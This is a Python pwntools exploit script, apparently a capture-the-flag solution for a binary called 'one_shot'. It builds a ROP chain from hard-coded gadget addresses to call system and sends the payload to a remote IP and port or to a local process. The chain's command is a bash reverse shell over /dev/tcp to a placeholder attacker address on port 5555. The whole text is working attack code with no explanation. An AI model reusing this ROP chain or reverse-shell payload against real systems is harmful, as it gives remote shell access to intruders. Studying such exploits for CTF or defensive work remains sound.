from pwn import *
import sys

env = {
    'LD_PRELOAD': './libc-2.24.so'
}

dbadd = 0x40084c
eax = 0x6012c7
write = 0x400673
poprdi = 0x400843
addr = 0x601200
moveax = 0x4006f7
add2al = 0x40084c
addal = 0x40084e

if sys.argv[1] == "1":
    r = remote('178.128.87.12', 31338)
else:
    r = process('./one_shot', env=env)
    raw_input('?')


payload = p32(0x8A919FF0)
payload += p32(0x300)
payload += "a"*2
payload += p32(8)
payload += p64(0) #0x60120a
payload = payload.ljust(0x27+4-4, '\x00')
payload += p32(8)
payload += p64(0) #0x601227
payload = payload.ljust(0x40, '\x00')
payload += p32(addr+0x0b)
payload += p32(addr+0x29)
payload += p32(0x50505050)
payload = payload.ljust(0x80, '\x00')

payload += p64(addr+0x20)#rbp
payload += p64(write)
payload += p64(0)
payload += p64(addr+4+0x20) #rbp
payload += p64(write+7)
payload += p64(0)
payload += p64(0x60120a+0x20) #rbp 
payload += p64(poprdi)
payload += p64(0x601028)
payload += p64(write+7)
payload += p64(0)
payload += p64(addr+0x3c+0xc) #rbp
payload += p64(moveax)
payload += p64(0)
payload += p64(0x601227+0x20) #rbp
payload += p64(add2al)
payload += p64(add2al)
payload += p64(addal)
payload += p64(poprdi)
payload += p64(0x60120a)
payload += p64(write+7)
payload += p64(0)
payload += p64(addr+0x40+0xc) #rbp
payload += p64(moveax)
payload += p64(0)
payload += p64(0x601227-3+0x20) #rbp
payload += p64(add2al)
payload += p64(add2al)
payload += p64(add2al)
payload += p64(poprdi)
payload += p64(addr+0x44)
payload += p64(write)
payload += p64(0) #rbx
payload += p64(0x601227-3+0x20) #rbp
payload += p64(poprdi)
payload += p64(addr+0x1d0)
payload += p64(0x40083c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x601227)
payload += p64(0)*3
payload += p64(0x400829) # call qword ptr [r12 + rbx*8] = [0x601227] = system

payload = payload.ljust(0x1d4, '\x00')
payload += 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/5555 0>&1"'
payload = payload.ljust(0x234, '\x00')

log.info("length: %#x" %len(payload))
r.send(payload)
r.interactive()
